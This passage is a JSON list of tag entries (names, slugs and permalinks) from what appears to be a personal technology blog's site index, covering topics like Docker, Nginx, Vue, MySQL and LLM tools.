me":"emgu","slug":"emgu","permalink":"https://banjinmei.github.io/tags/emgu/"},{"name":"uniapp","slug":"uniapp","permalink":"https://banjinmei.github.io/tags/uniapp/"},{"name":"mysql","slug":"mysql","permalink":"https://banjinmei.github.io/tags/mysql/"},{"name":"jmeter","slug":"jmeter","permalink":"https://banjinmei.github.io/tags/jmeter/"},{"name":"jvav","slug":"jvav","permalink":"https://banjinmei.github.io/tags/jvav/"},{"name":"nigix","slug":"nigix","permalink":"https://banjinmei.github.io/tags/nigix/"},{"name":"keepalived","slug":"keepalived","permalink":"https://banjinmei.github.io/tags/keepalived/"},{"name":"inotify","slug":"inotify","permalink":"https://banjinmei.github.io/tags/inotify/"},{"name":"rsync","slug":"rsync","permalink":"https://banjinmei.github.io/tags/rsync/"},{"name":"postman","slug":"postman","permalink":"https://banjinmei.github.io/tags/postman/"},{"name":"XAI","slug":"XAI","permalink":"https://banjinmei.github.io/tags/XAI/"},{"name":"Grok","slug":"Grok","permalink":"https://banjinmei.github.io/tags/Grok/"},{"name":"canal","slug":"canal","permalink":"https://banjinmei.github.io/tags/canal/"},{"name":"swagger","slug":"swagger","permalink":"https://banjinmei.github.io/tags/swagger/"},{"name":"vue3","slug":"vue3","permalink":"https://banjinmei.github.io/tags/vue3/"},{"name":"weather","slug":"weather","permalink":"https://banjinmei.github.io/tags/weather/"},{"name":"IIS","slug":"IIS","permalink":"https://banjinmei.github.io/tags/IIS/"},{"name":"orm","slug":"orm","permalink":"https://banjinmei.github.io/tags/orm/"},{"name":"vue","slug":"vue","permalink":"https://banjinmei.github.io/tags/vue/"},{"name":"json","slug":"json","permalink":"https://banjinmei.github.io/tags/json/"},{"name":"chacha20","slug":"chacha20","permalink":"https://banjinmei.github.io/tags/chacha20/"},{"name":"LLM","slug":"LLM","permalink":"https://banjinmei.github.io/tags/LLM/"},{"name":"ollama","slug":"ollama","permalink":"https://banjinmei.github.io/tags/ollama/"},{"name":"docker","slug":"docker","permalink":"https://banjinmei.github.io/tags/docker/"},{"name":"gitea","slug":"gitea","permalink":"https://banjinmei.github.io/tags/gitea/"},{"name":"gitlab","slug":"gitlab","permalink":"https://banjinmei.github.io/tags/gitlab/"},{"name":"npm","slug":"npm","permalink":"https://banjinmei.github.io/tags/npm/"},{"name":"mac","slug":"mac","permalink":"https://banjinmei.github.io/tags/mac/"},{"name":"recover","slug":"recover","permalink":"https://banjinmei.github.io/tags/recover/"},{"name":"roacle","slug":"roacle","permalink":"https://banjinmei.github.io/tags/roacle/"},{"name":"ase","slug":"ase","permalink":"https://banjinmei.github.io/tags/ase/"},{"name":"jquery","slug":"jquery","permalink":"https://banjinmei.github.io/tags/jquery/"},{"name":"qrcode","slug":"qrcode","permalink":"https://banjinmei.github.io/tags/qrcode/"},{"name":"electron","slug":"electron","permalink":"https://banjinmei.github.io/tags/electron/"},{"name":"go","slug":"go","permalink":"https://banjinmei.github.io/tags/go/"},{"name":"anolis","slug":"anolis","permalink":"https://banjinmei.github.io/tags/anolis/"},{"name":"koa","slug":"koa","permalink":"https://banjinmei.github.io/tags/koa/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"https://banjinmei.github.io/tags/rabbitmq/"},{"name":"git","slug":"git","permalink":"https://banjinmei.github.io/tags/git/"},{"name":"mssql","slug":"mssql","permalink":"https://banjinmei.github.io/tags/mssql/"},{"name":"Hologres","slug":"Hologres","permalink":"https://banjinmei.github.io/tags/Hologres/"},{"name":"postgresql","slug":"postgresql","permalink":"https://banjinmei.github.io/tags/postgresql/"},{"name":"SD","slug":"SD","permalink":"https://banjinmei.github.io/tags/SD/"},{"name":"it","slug":"it","permalink":"https://banjinmei.github.io/tags/it/"},{"name":"email","slug":"email","permalink":"https://banjinmei.github.io/tags/email/"},{"name":"nohup","slug":"nohup","permalink":"https://banjinmei.github.io/tags/nohup/"},{"name":"console","slug":"console","permalink":"https://banjinmei.github.io/tags/console/"},{"name":"aaxios","slug":"aaxios","permalink":"https://banjinmei.github.io/tags/aaxios/"},{"name":"cors","slug":"cors","permalink":"https://banjinmei.github.io/tags/cors/"},{"name":"timestamp","slug":"timestamp","permalink":"https://banjinmei.github.io/tags/timestamp/"},{"name":"yolo","slug":"yolo","permalink":"https://banjinmei.github.io/tags/yolo/"},{"name":"VUE","slug":"VUE","permalink":"https://banjinmei.github.io/tags/VUE/"},{"name":"yarn","slug":"yarn","permalink":"https://banjinmei.github.io/tags/yarn/"},{"name":"Nginx","slug":"Nginx","permalink":"https://banjinmei.github.io/tags/Nginx/"},{"name":"Docker","slug":"Docker","permalink":"https://banjinmei.github.io/tags/Docker/"},{"name":"Linux","slug":"Linux","permalink":"https://banjinmei.github.io/tags/Linux/"},{"name":"VM","slug":"VM","permalink":"https://banjinmei.github.io/tags/VM/"},{"name":"github","slug":"github","permalink":"https://banjinmei.github.io/tags/github/"},{"name":"WorldTime","slug":"WorldTime","permalink":"https://banjinmei.github.io/tags/WorldTime/"},{"name":"MySQL","slug":"MySQL","permalink":"https://banjinmei.github.io/tags/MySQL/"},{"name":"JSON","slug":"JSON","permalink":"https://banjinmei.github.io/tags/JSON/"},{"name":"Python","slug":"Python","permalink":"https://banjinmei.github.io/tags/Python/"},{"name":"AzureAI","slug":"AzureAI","permalink":"https://banjinmei.github.io/tags/AzureAI/"},{"name":"Azure","slug":"Azure","permalink":"https://banjinmei.github.io/tags/Azure/"},{"name":"OpenAI","slug":"OpenAI","permalink":"https://banjinmei.github.io/tags/OpenAI/"},{"name":"Dockerhub","slug":"Dockerhub","permalink":"https://banjinmei.github.io/tags/Dockerhub/"},{"name":"Redis","slug":"Redis","permalink":"https://banjinmei.github.io/tags/Redis/"},{"name":"RocketMQ","slug":"RocketMQ","permalink":"https://banjinmei.github.io/tags/RocketMQ/"},{"name":"hexo","slug":"hexo","permalink":"https://banjinmei.github.io/tags/hexo/"},{"name":"helloworld","slug":"helloworld","permalink":"https://banjinmei.github.io/tags/helloworld/"},{"name":"Typescript","slug":"Typescript","permalink":"https://banjinmei.github.io/tags/Typescript/"},{"name":"datatype","slug":"datatype","permalink":"https://banjinmei.github.io/tags/datatype/"},{"name":"interface","slug":"interface","permalink":"https://banjinmei.github.io/tags/interface/"},{"name":"type","slug":"type","permalink":"https://banjinmei.github.io/tags/type/"},{"name":"T","slug":"T","permalink":"https://banjinmei.github.io/tags/T/"},{"name":"extends","slug":"extends","permalink":"https://banjinmei.github.io/tags/extends/"},{"name":"class","slug":"class","permalink":"https://banjinmei.github.io/tags/class/"},{"name":"abstract","slug":"abstract","permalink":"https://banjinmei.github.io/tags/abstract/"},{"name":"implements","slug":"implements","permalink":"https://banjinmei.github.io/tags/implements/"},{"name":".netS","slug":"netS","permalink":"https://banjinmei.github.io/tags/netS/"},{"name":"Node.js","slug":"Node-js","permalink":"https://banjinmei.github.io/tags/Node-js/"},{"name":"util","slug":"util","permalink":"https://banjinmei.github.io/tags/util/"},{"name":"file","slug":"file","permalink":"https://banjinmei.github.io/tags/file/"},{"name":"getpost","slug":"getpost","permalink":"https://banjinmei.github.io/tags/getpost/"},{"name":"web","slug":"web","permalink":"https://banjinmei.github.io/tags/web/"},{"name":"express","slug":"express","permalink":"https://banjinmei.github.io/tags/express/"},{"name":"child_process","slug":"child-process","permalink":"https://banjinmei.github.io/tags/child-process/"},{"name":"mogodb","slug":"mogodb","permalink":"https://banjinmei.github.io/tags/mogodb/"},{"name":"event","slug":"event","permalink":"https://banjinmei.github.io/tags/event/"},{"name":"buffer","slug":"buffer","permalink":"https://banjinmei.github.io/tags/buffer/"},{"name":"stream","slug":"stream","permalink":"https://banjinmei.github.io/tags/stream/"},{"name":"c++","slug":"c","permalink":"https://banjinmei.github.io/tags/c/"},{"name":"router","slug":"router","permalink":"https://banjinmei.github.io/tags/router/"},{"name":"DES","slug":"DES","permalink":"https://banjinmei.github.io/tags/DES/"},{"name":"IOD","slug":"IOD","permalink":"https://banjinmei.github.io/tags/IOD/"},{"name":"POD","slug":"POD","permalink":"https://banjinmei.github.io/tags/POD/"},{"name":"webp","slug":"webp","permalink":"https://banjinmei.github.io/tags/webp/"},{"name":"AOT","slug":"AOT","permalink":"https://banjinmei.github.io/tags/AOT/"},{"name":"spider","slug":"spider","permalink":"https://banjinmei.github.io/tags/spider/"},{"name":"Avalonia","slug":"Avalonia","permalink":"https://banjinmei.github.io/tags/Avalonia/"},{"name":"JWT","slug":"JWT","permalink":"https://banjinmei.github.io/tags/JWT/"},{"name":"i18n","slug":"i18n","permalink":"https://banjinmei.github.io/tags/i18n/"},{"name":"Reids","slug":"Reids","permalink":"https://banjinmei.github.io/tags/Reids/"},{"name":"SignalR","slug":"SignalR","permalink":"https://banjinmei.github.io/tags/SignalR/"},{"name":"Swagger","slug":"Swagger","permalink":"https://banjinmei.github.io/tags/Swagger/"}]}